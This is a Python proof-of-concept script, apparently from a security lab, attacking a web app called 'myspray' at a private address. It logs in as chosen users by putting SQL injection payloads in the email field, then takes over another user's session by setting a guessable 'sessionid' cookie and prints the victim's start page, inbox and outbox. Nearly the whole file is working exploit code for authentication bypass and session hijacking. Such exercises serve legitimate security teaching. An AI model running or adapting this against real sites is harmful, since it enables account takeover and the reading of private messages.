import requests

url = "http://10.0.23.22/myspray/"

# Suppose Hanni Ball is the attacker.
s_attacker = requests.Session()
r_attacker = s_attacker.post(url, data={"email":"a' UNION SELECT * FROM community_member WHERE first_name='Hanni' AND last_name='Ball'; #", "password":"a"})

# Suppose N. O'Brian is the victim.
s_victim = requests.Session()
r_victim = s_victim.post(url, data={"email":"a' UNION SELECT * FROM community_member WHERE first_name='N.' AND last_name='O''Brian'; #", "password":"a"})

# The server differentiates both sessions by setting the cookie 'sessionid'. This id can be easily found out by looking at the user profile's
# URL. Hanni Ball's id is 92 ("profile92.html") and N. O'Brian's is 96 ("profile96.html").

# Clear the attacker's cookies.
s_attacker.cookies.clear()

# Send a request from the attacker's session, but setting the cookie as the victim's id. The server will display the victim's start page, and
# the attacker will be able to see the other user's "You have been sprayed by" list.
r_attacker = s_attacker.get(url + "start.html", cookies={"sessionid":"96"})

# Print HTML response.
print(r_attacker.content)

# Access the victim's inbox as the attacker.
r_attacker = s_attacker.get(url + "inbox.html", cookies={"sessionid":"96"})

# Print HTML response.
print(r_attacker.content)

# Access the victim's outbox as the attacker.
r_attacker = s_attacker.get(url + "outbox.html", cookies={"sessionid":"96"})

# Print HTML response.
print(r_attacker.content)
